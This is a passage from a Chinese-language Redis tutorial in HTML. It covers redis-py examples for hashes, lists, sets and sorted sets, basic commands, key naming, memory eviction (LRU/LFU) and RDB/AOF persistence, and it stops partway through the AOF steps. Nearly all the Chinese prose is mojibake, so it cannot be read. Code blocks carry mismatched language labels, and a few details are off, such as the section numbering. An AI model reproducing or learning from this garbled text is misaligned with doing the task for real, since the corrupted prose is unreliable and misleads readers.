<p><code>r.set("study:string", "hello redis from python", ex=60)</code>ï¼Œè¿™é‡Œçš„<code>ex</code>å°±æ˜¯ç§’æ•°ï¼Œå¦‚æœæ˜¯<code>px</code>å°±æ˜¯æ¯«ç§’æ•°ï¼Œè¿™é‡Œè®¾ç½®çš„æ—¶é—´å°±è¡¨æ˜keyçš„è¿‡æœŸæ—¶é—´ï¼Œå¦‚æœè¿‡æœŸäº†keyå°±ä¼šè¢«åˆ é™¤ã€‚</p>
<h5 data-id="heading-4">2.1 Hash</h5>
<p><code>Hash</code>æ˜¯ä¸€ä¸ªé”®å¯¹åº”å¤šä¸ªé”®å€¼å¯¹çš„ç»“æ„ï¼Œç±»ä¼¼äº<code>Map</code>å’Œå­—å…¸ï¼Œä¸€èˆ¬ç”¨æ¥å­˜å‚¨ç»“æ„åŒ–çš„å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">r.hset(<span class="hljs-string">"study:hash"</span>, mapping={
 Â  Â <span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
 Â  Â <span class="hljs-string">"age"</span>: <span class="hljs-string">"20"</span>,
})
â€‹
<span class="hljs-keyword">data</span> = r.hgetall(<span class="hljs-string">"study:hash"</span>)
print(<span class="hljs-keyword">data</span>) Â # {<span class="hljs-string">'name'</span>: <span class="hljs-string">'å¼ ä¸‰'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-string">'20'</span>}
</code></pre>
<p>å¦‚æœè¦åˆ é™¤<code>hash</code>ä¸­çš„æŒ‡å®šå­—æ®µçš„è¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•<code>hdel</code></p>
<pre><code class="hljs language-arduino" lang="arduino">r.<span class="hljs-built_in">hdel</span>(<span class="hljs-string">"study:hash"</span>, <span class="hljs-string">"age"</span>)
</code></pre>
<h5 data-id="heading-5">2.3 List</h5>
<p>è¿™é‡Œçš„<code>List</code>æ˜¯æŒ‰ç…§æ’å…¥é¡ºåºæ’åºçš„å­—ç¬¦ä¸²é›†åˆï¼Œæ”¯æŒä¸¤ç«¯æç¬‘å¢åˆ ï¼Œä¸­é—´æŸ¥è¯¢ç¨æ…¢ï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä»å³ä¾§ä¾æ¬¡å¡å…¥å‡ ä¸ªå…ƒç´ </span>
r.rpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
â€‹
<span class="hljs-comment"># ä»å·¦ä¾§å†å¡ä¸€ä¸ª</span>
r.lpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"pear"</span>) Â  <span class="hljs-comment"># list ç°åœ¨æ˜¯: ["pear", "apple", "banana", "orange"]</span>
â€‹
<span class="hljs-comment"># è¯»å–æ•´ä¸ª listï¼ˆ0 åˆ° -1 è¡¨ç¤ºæ‰€æœ‰å…ƒç´ ï¼‰</span>
items = r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:list ="</span>, items)
â€‹
<span class="hljs-comment"># å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼ˆæ¯”å¦‚ä»å·¦è¾¹å¼¹ï¼‰</span>
left = r.lpop(<span class="hljs-string">"study:list"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"lpop ä¹‹åå–å‡ºçš„ ="</span>, left)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å‰©ä¸‹çš„ ="</span>, r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1))
</code></pre>
<p>å¯ä»¥ç”¨æ¥å­˜å‚¨ä¸€äº›ä»»åŠ¡é˜Ÿåˆ—å’Œæ¶ˆæ¯é˜Ÿåˆ—</p>
<h5 data-id="heading-6">2.4 Set</h5>
<p><code>Set</code> æ˜¯æ— åºã€å…ƒç´ å”¯ä¸€çš„å­—ç¬¦ä¸²é›†åˆï¼Œæ”¯æŒé›†åˆé—´çš„äº¤ã€å¹¶ã€å·®è¿ç®—ï¼Œé€‚åˆå¤„ç† â€œå»é‡â€ å’Œ â€œå…³ç³»åŒ¹é…â€ åœºæ™¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¾€ set é‡ŒåŠ å…ƒç´ ï¼ˆå»é‡ï¼‰</span>
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>) Â <span class="hljs-comment"># å†åŠ ä¸€æ¬¡ä¸ä¼šé‡å¤</span>
â€‹
<span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰æˆå‘˜</span>
members = r.smembers(<span class="hljs-string">"study:set"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:set ="</span>, members)
â€‹
<span class="hljs-comment"># åˆ¤æ–­æŸä¸ªå€¼æ˜¯å¦åœ¨ set ä¸­</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦åŒ…å« apple:"</span>, r.sismember(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>))
â€‹
<span class="hljs-comment"># åˆ é™¤ä¸€ä¸ªæˆå‘˜</span>
r.srem(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤ banana å ="</span>, r.smembers(<span class="hljs-string">"study:set"</span>))
â€‹
<span class="hljs-comment"># ç»™æ•´ä¸ª set è®¾ç½®è¿‡æœŸæ—¶é—´ 60 ç§’</span>
r.expire(<span class="hljs-string">"study:set"</span>, 60)
</code></pre>
<h5 data-id="heading-7">2.5 ZSet</h5>
<p><code>ZSet</code> æ˜¯ Set çš„å‡çº§ç‰ˆï¼Œæ¯ä¸ªå…ƒç´ å…³è”ä¸€ä¸ª â€œåˆ†æ•°ï¼ˆscoreï¼‰â€ï¼ŒRedis ä¼šæŒ‰åˆ†æ•°ä»å°åˆ°å¤§æ’åºï¼Œå…¼å…· å”¯ä¸€æ€§ å’Œ æœ‰åºæ€§ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¾€ zset é‡ŒåŠ æ•°æ®ï¼šæˆå‘˜ + åˆ†æ•°</span>
r.zadd(<span class="hljs-string">"study:zset"</span>, {
 Â  Â <span class="hljs-string">"Alice"</span>: <span class="hljs-number">100</span>,
 Â  Â <span class="hljs-string">"Bob"</span>: <span class="hljs-number">80</span>,
 Â  Â <span class="hljs-string">"Charlie"</span>: <span class="hljs-number">95</span>,
})
â€‹
<span class="hljs-comment"># æŒ‰åˆ†æ•°ä»å°åˆ°å¤§å–å‡ºæ‰€æœ‰æˆå‘˜</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»å°åˆ°å¤§ï¼š"</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
â€‹
<span class="hljs-comment"># æŒ‰åˆ†æ•°ä»å¤§åˆ°å°å–å‡ºå‰ 2 å</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»å¤§åˆ°å°å‰2åï¼š"</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
â€‹
<span class="hljs-comment"># ç»™æŸä¸ªäººåŠ åˆ†ï¼ˆæ¯”å¦‚ Alice +10ï¼‰</span>
r.zincrby(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">10</span>, <span class="hljs-string">"Alice"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Alice åŠ åˆ†åï¼š"</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
â€‹
<span class="hljs-comment"># åˆ é™¤ä¸€ä¸ªæˆå‘˜</span>
r.zrem(<span class="hljs-string">"study:zset"</span>, <span class="hljs-string">"Bob"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤ Bob åï¼š"</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
</code></pre>
<p>æœ‰ä¸€ä¸ªå¸¸è§çš„é¢è¯•é¢˜ï¼Œ<code>Hash</code>å’Œ<code>String</code>éƒ½å¯ä»¥ç”¨æ¥å­˜å‚¨å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨é‚£ä¸ªæ¥å­˜å‚¨å¯¹è±¡å‘¢ï¼Œä½¿ç”¨<code>String</code>æ¥å­˜å‚¨å¯¹è±¡ï¼Œç®€å•ç›´è§‚ï¼Œä½†æ˜¯å®ƒä¸æ”¯æŒå±€éƒ¨æ›´æ–°ï¼Œæ”¹ä¸€ä¸ªå­—æ®µéœ€è¦è¦†ç›–è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé€‚åˆä¸€äº›æ•´ä½“è¯»å†™ã€å­—æ®µå°‘çš„åœºæ™¯ï¼›<code>Hash</code>å­˜å‚¨å¯¹è±¡ï¼Œä»–å°±æ”¯æŒå±€éƒ¨æ›´æ–°ï¼Œé€‚åˆä¸€äº›å¤æ‚å¯¹è±¡çš„å­˜å‚¨ï¼Œæ¯”å¦‚é«˜é¢‘æ›´æ–°å­—æ®µã€‚</p>
<h4 data-id="heading-8">3. redisåŸºæœ¬å‘½ä»¤</h4>
<p>å› ä¸º<code>Redis</code>éƒ½æ˜¯é”®å€¼å¯¹çš„å­˜å‚¨ï¼Œæ‰€ä»¥ä»–çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œçœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 1. SETï¼šè®¾ç½®ä¸€ä¸ªå­—ç¬¦ä¸² key</span>
r.<span class="hljs-keyword">set</span>(<span class="hljs-string">"study:string"</span>, <span class="hljs-string">"hello"</span>)
â€‹
<span class="hljs-meta"># 2. GETï¼šè¯»å–è¿™ä¸ª key</span>
print(<span class="hljs-string">"GET study:string ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:string"</span>)) Â <span class="hljs-meta"># hello</span>
â€‹
<span class="hljs-meta"># 3. INCRï¼šè‡ªå¢ä¸€ä¸ªæ•°å€¼å‹ key</span>
<span class="hljs-meta"># å¦‚æœè¿™ä¸ª key ä¸å­˜åœ¨ï¼Œä¼šä» 0 å¼€å§‹åŠ  1ï¼Œå˜æˆ "1"</span>
r.delete(<span class="hljs-string">"study:count"</span>) Â <span class="hljs-meta"># ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œå…ˆåˆ æ‰</span>
r.incr(<span class="hljs-string">"study:count"</span>) Â  Â <span class="hljs-meta"># å½“å‰å€¼ 1</span>
r.incr(<span class="hljs-string">"study:count"</span>) Â  Â <span class="hljs-meta"># å½“å‰å€¼ 2</span>
r.incr(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>) <span class="hljs-meta"># åŠ  5 -&gt; å½“å‰å€¼ 7</span>
print(<span class="hljs-string">"study:count ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:count"</span>)) Â <span class="hljs-meta"># 7</span>
â€‹
<span class="hljs-meta"># 4. EXPIREï¼šç»™ key è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå•ä½ï¼šç§’ï¼‰</span>
r.expire(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>) Â <span class="hljs-meta"># 5 ç§’åè¿‡æœŸ</span>
</code></pre>
<p>è¯»ã€å†™ã€è‡ªå¢å’Œè®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œéƒ½æ¯”è¾ƒç®€å•ã€‚</p>
<p>å› ä¸º<code>Redis</code>éƒ½æ˜¯é”®å€¼å¯¹ï¼Œæ²¡æœ‰è¡¨çš„æ¦‚å¿µï¼Œæ‰€ä»¥<code>Key</code>ç®¡ç†å°±æˆäº†é—®é¢˜ï¼Œç¤¾åŒºæœ‰ä¸€ä¸ªçº¦å®šçš„è§„èŒƒï¼š<code>ä¸šåŠ¡æ ‡è¯†:æ¨¡å—åç§°:å”¯ä¸€æ ‡è¯†[:å­å­—æ®µ]</code>ï¼Œæ¯”å¦‚<code>ecom:user:1001:name</code>ï¼Œè¿™å°±æ˜¯ç”µå•†ä¸šåŠ¡ï¼šç”¨æˆ·æ¨¡å—ï¼šç”¨æˆ·idï¼šç”¨æˆ·åã€‚è¿˜æœ‰ä¸€äº›é¢å¤–çš„è¡¥å……è§„èŒƒï¼š</p>
<ol start="0">
<li>ç»Ÿä¸€å°å†™ï¼šé¿å…å¤§å°å†™æ··ä¹±ï¼Œ<code>User:1</code>å’Œ<code>user:1</code>æ˜¯ä¸¤ä¸ªkey</li>
<li>ç®€æ´ä¸”è¯­ä¹‰åŒ–ï¼šçœ‹åˆ°åç§°åŸºæœ¬å°±èƒ½äº†è§£å­˜å‚¨çš„å†…å®¹</li>
<li>é¿å…ç‰¹æ®Šå­—ç¬¦ï¼šæ¯”å¦‚ç©ºæ ¼ã€æ¢è¡Œç¬¦ã€ä¸‹åˆ’çº¿</li>
</ol>
<h2 data-id="heading-9">ç¬¬äºŒé˜¶æ®µï¼šredisæ ¸å¿ƒæœºåˆ¶</h2>
<h4 data-id="heading-10">4.rediså†…å­˜æ¨¡å‹</h4>
<p><code>Redis</code>æ˜¯ä¸€ä¸ªå†…å­˜æ•°æ®åº“ï¼Œå¤§å¤šæ•°æ•°æ®éƒ½ä¿å­˜æ‰å†…å­˜ä¸­ã€‚å®ƒçš„å†…å­˜å¯ä»¥åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼Œæ ¸å¿ƒå†…å­˜å’Œè¾…åŠ©å†…å­˜ã€‚å…¶ä¸­æ ¸å¿ƒå†…å­˜å­˜å‚¨çš„å°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„é”®å€¼å¯¹ï¼Œä¹Ÿå°±æ˜¯<code>key</code>å†…å­˜å’Œ<code>value</code>å†…å­˜ï¼Œå­˜å‚¨çš„éƒ½æ˜¯æˆ‘ä»¬æ‰€ç”¨åˆ°çš„æ•°æ®ï¼›è¾…åŠ©å†…å­˜æ”¾çš„éƒ½æ˜¯éä¸šåŠ¡æ•°æ®ï¼Œå°±æ˜¯<code>Redis</code>è¿è¡Œæ‰€éœ€çš„é¢å¤–å†…å­˜ï¼Œæ¯”å¦‚ä¸€äº›è¿‡æœŸå­—å…¸ã€è¿›ç¨‹æœ¬èº«çš„å¼€é”€ç­‰ã€‚</p>
<p><code>Redis</code>æœ‰ä¸€å¥—å®Œå–„çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œä¸»è¦æœ‰è¿™ä¹ˆå‡ æ­¥</p>
<ol start="0">
<li>åŸºäº<code>jemalloc</code>å†…å­˜åˆ†é…ï¼Œå°†å†…å­˜åˆ’åˆ†ä¸ºä¸åŒå¤§å°çš„å†…å­˜é¡µï¼Œæ¯”å¦‚8Bï¼Œ16Bï¼Œ32Bç­‰ï¼Œåˆ†é…æ—¶åŒ¹é…æœ€æ¥è¿‘çš„é¡µï¼Œå‡å°‘ç¢ç‰‡ï¼›çº¿ç¨‹ç¼“å­˜ï¼Œå‡å°‘é”ç«äº‰ï¼Œæå‡åˆ†é…æ•ˆç‡</li>
<li>å†…å­˜å›æ”¶ï¼šå†…å­˜å›æ”¶ä¸»è¦æœ‰ä¸¤ç§ï¼Œæƒ°æ€§åˆ é™¤å’Œå®šæœŸåˆ é™¤ã€‚æƒ°æ€§åˆ é™¤æŒ‡çš„æ˜¯è®¿é—®keyæ—¶æ£€æŸ¥æ˜¯å¦è¿‡æœŸï¼Œè¿‡æœŸäº†å°±åˆ é™¤ï¼›å®šæœŸåˆ é™¤ï¼Œæ¯100mséšæœºæŠ½æŸ¥è¿‡æœŸçš„keyï¼Œå»åˆ é™¤å·²ç»è¿‡æœŸçš„ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœkeyè¿‡æœŸäº†ï¼Œä½†æ˜¯æ²¡æœ‰è¢«æŠ½æŸ¥åˆ°å‘¢ï¼Œä¸ºå•¥ä¸æ‰«æå…¨é‡çš„keyå‘¢ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¹³è¡¡äº†ï¼Œå…¨é‡æ‰«æéœ€è¦å ç”¨å¤§é‡çš„CPUï¼Œä¼šå½±å“åˆ°ä¸šåŠ¡çš„ï¼Œè¿™ä¸ªå°±å«åšå»¶è¿Ÿå›æ”¶ï¼Œä¹Ÿå°±æ˜¯è¯´å¯èƒ½ä¸€æ—¶åŠä¼šå›æ”¶ä¸äº†ï¼Œä½†æ˜¯ç»ˆå½’ä¼šè¢«å›æ”¶ã€‚</li>
</ol>
<p><code>Redis</code>çš„å†…å­˜å¤„ç†æœºåˆ¶å¤©ç„¶å°±æœ‰ä¸€ç§æ»åæ€§ï¼Œå¯èƒ½å°±ä¼šå‡ºç°å†…å­˜æ»¡äº†çš„æƒ…å†µï¼Œè¿™é‡Œçš„å†…å­˜æ»¡äº†ï¼Œå¹¶ä¸æ˜¯è®¾ç½®æŸä¸ªkeyçš„valueå¤§å°è¶…è¿‡512Mï¼Œè€Œæ˜¯<code>Redis</code>è¿›ç¨‹å ç”¨çš„å†…å­˜æ»¡äº†ï¼Œè¿™é‡Œçš„æ»¡æœ‰ä¸¤ä¸ªæ„æ€ï¼šä¸»åŠ¨è®¾ç½®çš„<code>maxmemory</code>ï¼Œè¿™ä¸ªåœ¨ç”Ÿäº§ç¯å¢ƒä¸Šæ˜¯å¿…é¡»è¦è®¾ç½®çš„</p>
<pre><code class="hljs language-bash" lang="bash">maxmemory 4GB  <span class="hljs-comment"># é™åˆ¶ Redis æœ€å¤§ä½¿ç”¨å†…å­˜ä¸º 4GB</span>
</code></pre>
<p>è¿˜æœ‰ä¸€ç§æ»¡å°±æ˜¯ï¼Œå¦‚æœä¸è®¾ç½®è¿™ä¸ªæœ€å¤§å€¼ï¼Œ<code>Redis</code>å°±ä¼šæ— é™åˆ¶çš„å ç”¨æœåŠ¡å™¨çš„ç‰©ç†å†…å­˜ï¼Œç›´åˆ°è€—å°½æœåŠ¡å™¨æ‰€æœ‰å¯ç”¨çš„ç‰©ç†å†…å­˜ï¼Œè¿™ä¸ªæ—¶å€™æ“ä½œç³»ç»Ÿä¼šå°†<code>Redis</code>çš„å†…å­˜æ•°æ®äº¤æ¢åˆ°ç£ç›˜çš„swapåˆ†åŒºï¼Œè¿™ä¸ªæ˜¯ç£ç›˜æ¨¡æ‹Ÿçš„å†…å­˜ï¼Œé€Ÿåº¦å·¨æ…¢ï¼Œæœ€ç»ˆå¯¼è‡´<code>Redis</code>æ€§èƒ½æš´è·Œï¼Œä¹Ÿå¯èƒ½å› ä¸ºæœåŠ¡å™¨å†…å­˜è€—å°½è€Œè¢«ç³»ç»Ÿæ€æ­»ã€‚</p>
<p>å½“å†…å­˜æ»¡äº†åï¼Œ<code>Redis</code>ä¹Ÿæœ‰ä¸€å¥—å†…å­˜æ·˜æ±°ç­–ç•¥æ¥å¤„ç†è¿™ç§æƒ…å†µï¼Œå½“<code>Redis</code>å ç”¨çš„å†…å­˜è¶…è¿‡è®¾ç½®çš„<code>maxmemory</code>åï¼Œç„¶åå†å»æ‰§è¡Œå†™æ“ä½œï¼Œå°±ä¼šå»è§¦å‘æˆ‘ä»¬çš„å†…å­˜æ·˜æ±°ç­–ç•¥ï¼Œä¸»è¦æœ‰è¿™ä¹ˆå‡ ç§ç­–ç•¥ï¼š</p>
<ol start="0">
<li>
<p>LRU</p>
<p>æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼Œå°±æ˜¯æ·˜æ±°é‚£äº›æœ€è¿‘è®¿é—®æ¬¡æ•°æœ€å°‘çš„keyï¼Œæ ‡å‡†çš„LRUéœ€è¦ç»´æŠ¤ä¸€ä¸ªè®¿é—®æ—¶é—´é“¾è¡¨ï¼Œå†…å­˜å’Œcpuå¼€é”€å¤§ï¼Œ<code>Redis</code>å®ç°çš„æ˜¯è¿‘ä¼¼LRUï¼šç»´æŠ¤ä¸€ä¸ªå€™é€‰æ± ï¼Œè§¦å‘æ·˜æ±°æ—¶ï¼Œä»ç›®æ ‡èŒƒå›´éšæœºæŠ½å–keyï¼Œä¹Ÿå°±æ˜¯è§¦å‘æ·˜æ±°æ—¶ï¼ŒéšæœºæŠ½å–ä¸€æ‰¹keyï¼Œç„¶åæ¯”ä¸€æ¯”è°çš„è®¿é—®æ—¶é—´æœ€è¿œï¼Œç„¶åå°±æ·˜æ±°å®ƒã€‚</p>
</li>
<li>
<p>LFU</p>
<p>ä¼˜å…ˆæ·˜æ±°è®¿é—®é¢‘ç‡æœ€ä½çš„keyï¼Œ<code>Redis</code>å®ç°çš„LFUå¹¶ä¸æ˜¯ç®€å•çš„è®¿é—®æ¬¡æ•°ç»Ÿè®¡ï¼Œè€Œæ˜¯é€šè¿‡æ¦‚ç‡é€’å¢çš„è®¿é—®è®¡æ•°+æ—¶é—´è¡°å‡æœºåˆ¶æ¥è¿‘ä¼¼çš„ååº”keyçš„é•¿æœŸè®¿é—®ä»·å€¼ï¼›åœ¨è§¦å‘æ·˜æ±°æ—¶ï¼Œåœ¨é€šè¿‡éšæœºé‡‡æ ·çš„æ–¹å¼é€‰æ‹©è®¿é—®è¯„ç‡æœ€ä½çš„keyå»æ·˜æ±°ã€‚</p>
</li>
</ol>
<p>å½“å†…å­˜æ»¡äº†åï¼Œå†å»å¯¹æ•°æ®åº“åšè¯»å†™æ“ä½œï¼Œè¯»çš„æ“ä½œæ²¡æœ‰å½±å“ï¼Œä½†æ˜¯åœ¨è§¦å‘å†™çš„æ“ä½œæ—¶ï¼Œå¦‚æœå†…å­˜æ»¡äº†ï¼Œä¼šå…ˆæ ¹æ®<code>maxmemory-policy</code>è®¾ç½®çš„å†…å­˜æ·˜æ±°ç­–ç•¥ï¼Œåœ¨å†™æ“ä½œè§¦å‘çš„åŒæ—¶æ ¹æ®LFUã€LRUå»æ›´æ–°å†…å­˜ï¼Œç›´åˆ°å†…å­˜ä¼šåˆ°å®‰å…¨åŒºï¼›å¦‚æœå†…å­˜æ·˜æ±°ç­–ç•¥å‘³ä¸º<code>noeviction</code>æˆ–è€…æ— æ³•æ·˜æ±°ï¼Œç›´æ¥å›æŠ¥é”™ã€‚</p>
<h4 data-id="heading-11">5.æŒä¹…åŒ–æœºåˆ¶</h4>
<p>å‰é¢ä¹Ÿæåˆ°äº†ï¼Œ<code>Redis</code>æ˜¯ä¸€ç§åŸºäºå†…å­˜çš„é”®å€¼æ•°æ®åº“ï¼Œå†…å­˜çš„ç‰¹æ€§å°±æ˜¯åœ¨æœåŠ¡å™¨é‡å¯åä¼šå…¨éƒ¨ä¸¢å¤±ï¼Œè¿™å°±éœ€è¦å°†æ•°æ®åšæŒä¹…åŒ–ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯äº†ï¼Œä¹Ÿå¯ä»¥ä»ç£ç›˜ä¸­æ¢å¤æ•°æ®è‡³å†…å­˜ã€‚</p>
<p><code>Redis</code>æä¾›äº†ä¸¤ç§æ ¸å¿ƒçš„æŒä¹…åŒ–æ–¹å¼ï¼šRDBå’ŒAOFï¼Œå¿«ç…§æŒä¹…åŒ–å’Œè¿½åŠ æ–‡ä»¶æŒä¹…åŒ–ï¼Œæ¥ä¸‹æ¥æŒ¨ä¸ªä»‹ç»ä¸‹ï¼š</p>
<h6 data-id="heading-12">å¿«ç…§æŒä¹…åŒ–</h6>
<p>RDBæ˜¯å®šæ—¶å¯¹<code>Redis</code>å†…å­˜ä¸­çš„å…¨é‡æ•°æ®åšä¸€æ¬¡æ‹ç…§ï¼Œç”Ÿæˆä¸€ä¸ªå‹ç¼©çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯”å¦‚<code>dump.rdb</code>ï¼Œä¿å­˜åˆ°ç£ç›˜çš„æŒ‡å®šç›®å½•ã€‚<code>Redis</code>é‡å¯æ—¶ç›´æ¥åŠ è½½è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†æ•°æ®æ¢å¤åˆ°å†…å­˜ä¸­ã€‚</p>
<p>RDBæœ‰æ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ä¸¤ç§æ–¹å¼ï¼šæ‰‹åŠ¨è§¦å‘å¯ä»¥ä½¿ç”¨<code>save</code>æ¥åŒæ­¥è§¦å‘ï¼ŒåŒæ­¥è§¦å‘ä¼šé˜»å¡ä¸»è¿›ç¨‹ï¼Œç›´åˆ°RDBæ–‡ä»¶ç”Ÿæˆå®Œæˆï¼Œå¼‚æ­¥è§¦å‘é€šè¿‡<code>bgsave</code>æ¥è§¦å‘ï¼Œ<code>Redis</code>ä¼šforkä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡ŒRDBæ–‡ä»¶çš„ç”Ÿæˆï¼Œä¸»è¿›ç¨‹ä¼šç»§ç»­å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼›è‡ªåŠ¨è§¦å‘æ˜¯åœ¨é…ç½®æ–‡ä»¶<code>redis.conf</code>ä¸­é€šè¿‡å¿«ç…§è§„åˆ™æ¥é…ç½®çš„ï¼Œæ»¡è¶³æ¡ä»¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>bgsave</code></p>
<pre><code class="hljs language-bash" lang="bash">save 900 1 Â  Â   <span class="hljs-comment"># 900 ç§’å†…è‡³å°‘ 1 æ¬¡å†™</span>
save 300 10 Â  Â  <span class="hljs-comment"># 300 ç§’å†…è‡³å°‘ 10 æ¬¡å†™</span>
save 60 10000 Â  <span class="hljs-comment"># 60 ç§’å†…è‡³å°‘ 10000 æ¬¡å†™</span>
</code></pre>
<p>è¿™é‡Œå°±æ˜¯è‡ªåŠ¨è§¦å‘RDBçš„è§„åˆ™ï¼šæ»¡è¶³å…¶ä¸­çš„ä»»æ„æ¡ä»¶å°±ä¼šè§¦å‘ä¸€æ¬¡ï¼Œæ¯”å¦‚60så†…å†™ä¸€æ¬¡ã€300så†…å†™10æ¬¡ç­‰ã€‚</p>
<p>RDBä¼˜ç‚¹å°±åœ¨äºæ€§èƒ½å¼€é”€å°ï¼Œç”ŸæˆRDBç”±å­è¿›ç¨‹è´Ÿè´£ï¼Œä¸»è¿›ç¨‹ä»…åšforkæ“ä½œï¼Œå‡ ä¹ä¸å½±å“ä¸šåŠ¡ï¼›äºŒè¿›åˆ¶æ–‡ä»¶ç›´æ¥åŠ è½½åˆ°å†…å­˜é€Ÿåº¦ä¹Ÿå¾ˆå¿«ã€‚ä½†æ˜¯ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼ŒRDBæ˜¯å®šæ—¶å¿«ç…§ï¼Œå¦‚æœ<code>Redis</code>æ„å¤–å´©æºƒï¼Œæ¯”å¦‚æœåŠ¡å™¨æ–­ç”µï¼Œå°±ä¼šä¸¢æ‰æœ€åä¸€æ¬¡å¿«ç…§å‰åˆ°å´©æºƒå‰çš„æ‰€æœ‰æ•°æ®ã€‚</p>
<h6 data-id="heading-13">è¿½åŠ æ—¥å¿—æŒä¹…åŒ–</h6>
<p>AOFå°±æ˜¯ä¸ºäº†è§£å†³RDBæ•°æ®åº“ä¸¢å¤±è€Œè®¾è®¡çš„æŒä¹…åŒ–æ–¹å¼ï¼Œå°±æ˜¯å°†<code>Redis</code>çš„æ“ä½œæ—¥å¿—æŒ‰ç…§é¡ºåºè®°å½•ä¸‹æ¥ï¼Œé‡å¯åé€šè¿‡é‡æ”¾AOFæ–‡ä»¶ä¸­æ‰€æœ‰çš„å†™å‘½ä»¤å»æ¢å¤å†…å­˜æ•°æ®ã€‚é»˜è®¤æ˜¯å…³é—­çš„ï¼Œéœ€è¦<code>appendonly yes</code>å‘½ä»¤æ¥æ‰‹åŠ¨é‡å¯ã€‚</p>
<p>AOFçš„ç›¸å…³é…ç½®åœ¨<code>redis.conf</code>æ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-bash" lang="bash">appendonly <span class="hljs-built_in">yes</span> <span class="hljs-comment"># å¼€å¯AOFï¼ˆé»˜è®¤noï¼Œå…³é—­ï¼‰</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOFæ–‡ä»¶åï¼Œé»˜è®¤ä¿å­˜åœ¨Rediså·¥ä½œç›®å½•</span>
<span class="hljs-built_in">dir</span> ./ <span class="hljs-comment"># æŒä¹…åŒ–æ–‡ä»¶ï¼ˆRDB/AOFï¼‰çš„ä¿å­˜ç›®å½•ï¼Œé»˜è®¤æ˜¯Rediså¯åŠ¨ç›®å½•</span>
</code></pre>
<p>AOFä¸»è¦åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ol start="0">
<li>
<p>å‘½ä»¤è¿½åŠ </p>
